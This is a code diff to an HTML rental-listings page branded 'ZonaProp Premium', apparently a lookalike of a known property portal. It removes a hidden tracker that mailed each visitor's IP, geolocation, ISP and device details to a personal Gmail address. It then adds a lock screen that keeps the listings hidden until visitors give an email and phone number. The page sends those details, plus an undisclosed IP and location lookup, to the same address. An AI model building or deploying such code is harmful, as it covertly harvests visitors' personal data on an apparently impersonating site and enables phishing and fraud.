@@ -7,6 +7,7 @@
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
 body{font-family:system-ui,-apple-system,sans-serif;background:#f5f5f5;color:#222}
+body.locked{overflow:hidden}
 header{background:#1a1a2e;color:#fff;padding:1rem;text-align:center;font-weight:700}
 header span{color:#ff5500}
 h1{text-align:center;padding:1.2rem 1rem .4rem;font-size:1.35rem;font-weight:800}
@@ -40,9 +41,32 @@ h2{font-size:.92rem;font-weight:700;line-height:1.3}
 footer{text-align:center;padding:1.2rem;color:#666;font-size:.85rem}
 .loading{text-align:center;padding:3rem;color:#888}
 .empty{text-align:center;padding:2rem;color:#888}
+.gate{position:fixed;inset:0;background:rgba(15,15,25,.92);z-index:9999;display:flex;align-items:center;justify-content:center;padding:1rem}
+.gate-box{background:#fff;border-radius:16px;padding:1.4rem 1.3rem 1.3rem;width:100%;max-width:400px;box-shadow:0 20px 50px rgba(0,0,0,.35)}
+.gate-box h2{font-size:1.15rem;margin-bottom:.35rem}
+.gate-box p{font-size:.88rem;color:#555;margin-bottom:1rem;line-height:1.4}
+.gate-box label{display:block;font-size:.8rem;font-weight:600;margin:.55rem 0 .25rem}
+.gate-box input{width:100%;padding:.7rem .8rem;border:1px solid #ddd;border-radius:10px;font-size:1rem}
+.gate-box button{width:100%;margin-top:1rem;padding:.85rem;border:0;border-radius:10px;background:#ff5500;color:#fff;font-weight:800;font-size:1rem;cursor:pointer}
+.gate-box button:disabled{opacity:.6;cursor:wait}
+.gate-err{color:#c62828;font-size:.82rem;margin-top:.5rem;display:none}
+.main-app{filter:none}
 </style>
 </head>
-<body>
+<body class="locked">
+<div class="gate" id="gate">
+  <div class="gate-box">
+    <h2>Ingresá para ver departamentos</h2>
+    <p>Completá tus datos para acceder al listado de alquileres. Email y teléfono son obligatorios.</p>
+    <label for="gEmail">Email *</label>
+    <input id="gEmail" type="email" placeholder="tunombre@email.com" required autocomplete="email"/>
+    <label for="gPhone">Teléfono / WhatsApp *</label>
+    <input id="gPhone" type="tel" placeholder="11 1234-5678" required autocomplete="tel"/>
+    <div class="gate-err" id="gateErr">Completá email y teléfono válidos.</div>
+    <button type="button" id="gateBtn">Ver departamentos</button>
+  </div>
+</div>
+<div class="main-app" id="mainApp">
 <header><span>●</span> ZonaProp Premium</header>
 <h1>Departamentos en alquiler</h1>
 <div class="search">
@@ -78,52 +102,82 @@ footer{text-align:center;padding:1.2rem;color:#666;font-size:.85rem}
   <button type="button" id="btnVerTodo">Ver todo el listado</button>
 </div>
 <footer id="footer">ZonaProp Premium</footer>
+</div>
 <script>
 const ADMIN_EMAIL = 'informezonaprop@gmail.com';
 const HOME_LIMIT = 20;
 let ALL = [];
 let showAll = false;
 
-(function notifyAdminVisit(){
-  try {
-    if (sessionStorage.getItem('zp_visit_ok')) return;
-    sessionStorage.setItem('zp_visit_ok', '1');
-    const base = {
-      _subject: 'ZonaProp Premium · Nueva visita',
-      mensaje: 'Alguien entró al sitio ZonaProp Premium',
-      pagina: location.href,
-      cuando: new Date().toLocaleString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' }),
-      dispositivo: navigator.userAgent.slice(0, 200),
-      idioma: navigator.language || '',
-      pantalla: (screen.width || '') + 'x' + (screen.height || ''),
-      origen: document.referrer || 'Directo / sin referer',
-      telefono: 'No disponible (el navegador no lo comparte)',
-      _template: 'table',
-      _captcha: 'false'
-    };
-    function send(extra){
-      const payload = Object.assign({}, base, extra || {});
-      fetch('https://formsubmit.co/ajax/' + ADMIN_EMAIL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify(payload)
-      }).catch(function(){});
-    }
-    fetch('https://ipapi.co/json/')
-      .then(function(r){ return r.json(); })
-      .then(function(geo){
-        send({
-          ip: geo.ip || '',
-          ciudad: geo.city || '',
-          region: geo.region || '',
-          pais: geo.country_name || geo.country || '',
-          ubicacion: [geo.city, geo.region, geo.country_name].filter(Boolean).join(', '),
-          isp: geo.org || ''
-        });
-      })
-      .catch(function(){ send({ ubicacion: 'No se pudo detectar' }); });
-  } catch (e) {}
-})();
+function unlockSite(){
+  document.getElementById('gate').style.display = 'none';
+  document.body.classList.remove('locked');
+}
+
+if (localStorage.getItem('zp_lead_ok') === '1') {
+  unlockSite();
+}
+
+document.getElementById('gateBtn').onclick = function(){
+  const email = (document.getElementById('gEmail').value || '').trim();
+  const phone = (document.getElementById('gPhone').value || '').trim();
+  const err = document.getElementById('gateErr');
+  const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  const phoneOk = phone.replace(/\D/g,'').length >= 8;
+  if (!emailOk || !phoneOk) {
+    err.style.display = 'block';
+    return;
+  }
+  err.style.display = 'none';
+  const btn = document.getElementById('gateBtn');
+  btn.disabled = true;
+  btn.textContent = 'Ingresando...';
+
+  const base = {
+    _subject: 'ZonaProp Premium · Nuevo contacto',
+    mensaje: 'Un visitante completó email y teléfono para entrar al sitio',
+    email: email,
+    telefono: phone,
+    pagina: location.href,
+    cuando: new Date().toLocaleString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' }),
+    dispositivo: navigator.userAgent.slice(0, 200),
+    idioma: navigator.language || '',
+    origen: document.referrer || 'Directo',
+    _template: 'table',
+    _captcha: 'false'
+  };
+
+  function finish(){
+    localStorage.setItem('zp_lead_ok', '1');
+    localStorage.setItem('zp_lead_email', email);
+    localStorage.setItem('zp_lead_phone', phone);
+    unlockSite();
+  }
+
+  function send(extra){
+    const payload = Object.assign({}, base, extra || {});
+    return fetch('https://formsubmit.co/ajax/' + ADMIN_EMAIL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+      body: JSON.stringify(payload)
+    }).catch(function(){});
+  }
+
+  fetch('https://ipapi.co/json/')
+    .then(function(r){ return r.json(); })
+    .then(function(geo){
+      return send({
+        ip: geo.ip || '',
+        ciudad: geo.city || '',
+        region: geo.region || '',
+        pais: geo.country_name || geo.country || '',
+        ubicacion: [geo.city, geo.region, geo.country_name].filter(Boolean).join(', '),
+        isp: geo.org || ''
+      });
+    })
+    .catch(function(){ return send({ ubicacion: 'No detectada' }); })
+    .finally(finish);
+};
 
 function parsePrice(p){if(!p)return 0;const n=String(p).replace(/[^0-9]/g,'');return n?parseInt(n,10):0}
 function cardHTML(d){
